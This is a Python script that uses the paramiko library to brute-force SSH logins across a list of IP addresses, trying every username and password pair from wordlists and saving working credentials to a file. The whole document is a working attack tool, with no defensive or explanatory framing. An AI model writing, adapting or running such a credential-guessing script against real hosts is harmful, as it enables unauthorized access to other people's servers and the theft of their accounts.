import paramiko
import time

port = 22
max_retries = 5

# Load the list of usernames and passwords from files
with open("programdata/user.txt", "r") as f:
    usernames = [line.strip() for line in f.readlines()]
with open("programdata/pass.txt", "r") as f:
    passwords = [line.strip() for line in f.readlines()]

# Attempt to connect to the SSH server for each IP address in the file
with open("programdata/sships.txt", "r") as f, open("programdata/yay.txt", "w") as f2:
    for ip in f.readlines():
        host = ip.strip()
        f2.write(f"\nIP Address: {host}\n")
        print(f"Trying to connect to {host}...")
        connected = False
        for i in range(max_retries):
            if connected == True:
                connected = False
                break
            for username in usernames:
                for password in passwords:
                    try:
                        ssh = paramiko.SSHClient()
                        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                        ssh.connect(host, port=port, username=username, password=password)
                        print(f"Successful login to {host} with username '{username}' and password '{password}'")
                        f2.write(f"Username: {username}\tPassword: {password}\n")
                        ssh.close()
                        connected = True
                        break
                    except paramiko.AuthenticationException:
                        print(f"Failed login attempt to {host} with username '{username}' and password '{password}'")
                    except paramiko.SSHException as e:
                        print(f"Error connecting to {host}: {e}")
            if connected:
                break
            else:
                time.sleep(1)
        if not connected:
            print(f"Could not connect to {host} after {max_retries} retries")
